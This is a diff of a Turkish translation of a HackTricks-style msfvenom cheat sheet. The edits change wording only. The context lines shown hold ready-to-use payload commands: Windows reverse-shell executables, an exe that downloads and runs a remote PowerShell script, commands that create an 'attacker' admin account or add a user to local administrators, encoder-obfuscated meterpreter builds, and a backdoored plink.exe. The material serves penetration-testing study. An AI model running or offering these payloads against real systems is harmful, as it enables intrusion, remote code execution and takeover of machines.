@@ -1,4 +1,6 @@
-# MSFVenom - CheatSheet
+# MSFVenom - Hile Sayfası
+
+{{#include ../../banners/hacktricks-training.md}}
 
 ---
 
@@ -6,16 +8,16 @@
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-Payload architecture'ını seçmek için `-a`, hedef platformunu seçmek için `--platform` kullanın.<sup>[[1]](#references)</sup>
+Payload mimarisini seçmek için `-a`, hedef platformunu seçmek için `--platform` kullanın.<sup>[[1]](#references)</sup>
 
 ## Listeleme
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-Bu komutlar, kurulu framework'te kullanılabilir olan payload ve encoder modüllerini listeler.<sup>[[1]](#references)</sup>
+Bu komutlar, kurulu framework'te kullanılabilen payload ve encoder modüllerini listeler.<sup>[[1]](#references)</sup>
 
-## shellcode oluştururken kullanılan yaygın parametreler
+## Shellcode oluştururken kullanılan yaygın parametreler
 ```bash
 -b "\x00\x0a\x0d"
 -f c
@@ -23,7 +25,7 @@ Bu komutlar, kurulu framework'te kullanılabilir olan payload ve encoder modüll
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
-Burada gösterilen flag'ler kötü karakterleri, çıktı formatını, encoder'ı ve encoding yinelemelerini seçer.<sup>[[1]](#references)</sup>
+Burada gösterilen flag'ler bad characters, çıktı formatı, encoder ve encoding iterasyonlarını seçer.<sup>[[1]](#references)</sup>
 
 ## **Windows**
 
@@ -43,7 +45,7 @@ msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
 ```
-### **Komut Çalıştır**
+### **Komut Yürütme**
 ```bash
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
@@ -56,7 +58,7 @@ msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > enco
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
-## Linux Payloads
+## Linux Payload'ları
 
 ### Reverse Shell
 ```bash
